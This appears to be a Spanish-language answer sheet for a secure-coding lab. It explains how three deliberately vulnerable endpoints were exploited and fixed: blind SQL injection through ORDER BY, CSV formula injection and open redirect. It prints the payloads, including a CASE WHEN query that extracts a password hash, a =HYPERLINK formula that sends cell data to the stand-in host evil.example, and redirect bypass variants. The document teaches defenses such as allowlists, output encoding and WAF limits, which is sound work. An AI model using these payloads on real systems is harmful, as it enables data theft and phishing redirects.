# Respuestas

## Etapa 1

### Cómo se explotó cada reto (resumen)

| Reto | Payload | Resultado en `/vuln` | Resultado en `/secure` | Evidencia |
|---|---|---|---|---|
| 1 · ORDER BY | `sort=(CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE username='admin')='p' THEN id ELSE -id END)` | El orden cambia según la condición. Con `attacks/blind_order_by.py` extraje el hash completo de `admin` (`pbkdf2_sha256$demo$FAKEHASH`) en 853 requests, respetando el rate limit del gateway | `422`, la consulta no se ejecuta | `evidencia/etapa-1/reto1-*.png` |
| 2 · CSV | body `=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")` y body `uno,dos,tres⏎fila,fantasma` | Al abrir el CSV en LibreOffice Calc la celda es una fórmula que arma un link con el contenido de A1 (exfiltración); las comas y el salto inventan columnas y una fila | La celda sale como `'=HYPERLINK(...)` (texto) y cada fila tiene siempre 2 columnas | `evidencia/etapa-1/reto2-*.png`, `vuln.csv`, `secure.csv` |
| 3 · Redirect | `next=https://evil.example/login`, `next=//evil.example` | `302` con `Location` hacia `evil.example` | `302` con `Location: /`; `/secure/comments?filter=x` y `/app/#alice` se respetan | `evidencia/etapa-1/reto3-open-redirect.png` |

Un detalle que apareció probando el reto 3: con `next=/\evil.example`, `RedirectResponse` de Starlette codifica la barra invertida y devuelve `Location: /%5Cevil.example`, así que esa variante puntual no sale del sitio *por accidente del framework*. No es una defensa en la que convenga confiar (otro framework, o un `Response` armado a mano, no lo hace), por eso la versión segura la rechaza explícitamente.

### 1. Técnica principal y capa de cada reto

| Reto | Técnica | Capa | Dónde |
|---|---|---|---|
| 1 | **Validar con allowlist** (y que el fragmento SQL salga de nuestro código). No es parametrización: los identificadores no se pueden parametrizar | Frontera del servicio (tipo `Literal`, `422`) + sink SQL (diccionarios `SORT_COLUMNS`/`SORT_DIRECTIONS`) | `routes_secure.sorted_comments` |
| 2 | **Codificar en la salida**, con dos encoders para dos contextos: `csv.writer(QUOTE_ALL)` para la estructura del archivo y `spreadsheet_cell` para el contenido de la celda | Salida | `encoding.spreadsheet_cell`, `routes_secure.export_csv` |
| 3 | **Validar con allowlist** de destinos (path relativo con prefijo conocido) y fallar cerrado | Frontera del servicio | `validation.safe_redirect_target`, `routes_secure.redirect_after_login` |

### 2. Reto 1: ¿por qué no alcanza con "parametrizar todo"?

Porque el motor compila la **estructura** de la consulta antes de recibir los parámetros, y un `?` solo puede ocupar el lugar de un **valor** (un literal). `ORDER BY ?` con `"author"` ordena por la constante `'author'` (o sea, no ordena), no por la columna. Tampoco se pueden parametrizar:

- nombres de **tablas y columnas** (identificadores);
- **palabras clave**: `ASC`/`DESC`, `NULLS FIRST`, `JOIN`, `UNION`;
- **operadores** (`=`, `<`, `LIKE`) y funciones;
- en muchos motores, `LIMIT`/`OFFSET` tampoco aceptan parámetros.

Para todo eso, la única defensa sólida es una **allowlist que traduce** la opción del usuario a un fragmento escrito por nosotros: la entrada elige una clave del diccionario, nunca aporta texto a la consulta.

### 3. Reto 2: ¿encoder al guardar o al exportar?

**Al exportar.** Tres razones:

1. **Las filas viejas.** El dato peligroso puede haber entrado antes del fix o por otra vía (en la demo, por `/vuln/comments`). Si el encoder estuviera en el alta, esas filas saldrían crudas. Al exportar, se neutraliza todo lo que hay en la base, sin migraciones.
2. **El encoder depende del destino.** La comilla delante de `=` solo tiene sentido en una planilla. Guardar `'=1+1` en la base ensucia el dato para el HTML, la API JSON o cualquier otro consumidor (que mostrarían una comilla de más).
3. **Un solo lugar.** Todo lo que genere CSV pasa por el mismo encoder; no depende de que cada endpoint de alta se acuerde.

Al guardar sí corresponde **validar** (largo, caracteres de control, tipo); codificar, al salir.

### 4. Reto 3: ¿por qué redirigir a `/` y no devolver 400?

- **La víctima es el usuario legítimo**, no el atacante: llegó por un link armado por otro y ya se logueó. Un 400 le rompe el flujo y le deja una pantalla de error; mandarlo al inicio es inocuo y le permite seguir.
- **Falla cerrado igual**: el destino malicioso nunca se usa; lo único que se pierde es "volver a donde estaba", que es una comodidad.
- **No da oráculo**: con 400, el atacante puede probar variantes (`//`, `/\`, `%2F`, `%09`) y ver cuál "pasa" según el código de respuesta. Si todo lo inválido termina igual (`302 → /`), hay menos información para afinar el bypass.
- Si hace falta visibilidad, el rechazo se **loguea** del lado del servidor.

### 5. ¿Lo hubiera frenado el gateway o un WAF con OWASP CRS?

**El `nginx.conf` actual: ninguno de los tres.** Solo mira tasa, tamaño, content type y la ruta `/internal/`; los tres payloads son requests chicos, con el content type correcto, a rutas permitidas. Lo único que hizo fue *frenar* (no impedir) el reto 1: el rate limit obliga a espaciar los 853 requests de la extracción.

**Un WAF con CRS: lo probé** (bonus, ver `BONUS.md` y `evidencia/etapa-1/bonus-waf-modsecurity-crs.png`), con `owasp/modsecurity-crs:nginx-alpine`, CRS 4.30.0, paranoia 1:

| Reto | ¿Bloqueado? | Por qué |
|---|---|---|
| 1 | **Sí** (403), incluso la variante con `/**/` en lugar de espacios | El payload tiene la forma clásica de SQLi (`SELECT ... FROM`, `CASE WHEN`, comillas): coincide con las reglas 942xxx. Pero el **punto de inyección sigue abierto**: `sort=-id` u otras expresiones sin palabras clave pasan, y con paranoia 1 hay técnicas de evasión conocidas. El WAF reduce la superficie, no la cierra |
| 2 | **No** (201 al guardar, 200 al exportar) | `=HYPERLINK("https://...")` no es un ataque para HTTP: es texto válido en un comentario. El daño ocurre después, en la planilla de otra persona, en un contexto que el WAF no ve |
| 3 | **No** (302 hacia `evil.example`) | `https://evil.example/login` es un valor perfectamente normal para un parámetro de URL. Qué destinos son legítimos es una regla **del negocio de esta app**; ningún WAF genérico puede saberlo |

Conclusión: el borde sirve para cortar ruido barato y payloads de manual, pero los ataques que dependen del **contexto de salida** (CSV) o de **reglas de la aplicación** (destinos válidos) solo se resuelven en el servicio.
